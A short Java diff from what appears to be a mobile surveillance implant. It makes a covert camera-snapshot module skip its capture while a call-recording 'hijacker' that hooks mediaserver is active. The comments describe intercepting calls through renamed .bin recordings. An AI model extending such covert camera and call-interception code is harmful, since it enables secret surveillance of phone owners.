@@ -60,7 +60,20 @@ public class ModuleCamera extends BaseInstantModule {
 	@Override
 	public void actualStart() {
 		try {
+			// todo: Best scenario: module detects when the call is on going which is when a *.bin is present in l4
+			// below here the if doesn't work because isRecording is true only after the first .bin has been renamed by hijack in .tmp
+			// Actually, the hijack is already recording even before the first .bin has been renamed in .tmp, the usage of the camera can kill
+			// mediaserver. Temporary the ModuleCamera checks if the hijacker has been installed, in this case the snapshot is skipped.
+			//if (ModuleCall.self() != null && ModuleCall.self().isRecording()) {
+			if (ModuleCall.self() != null && ModuleCall.self().canRecord()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart), call recording, cannot get snapshot");
+				}
+				return;
+			}
+
 			snapshot();
+
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart) Error: " + e);
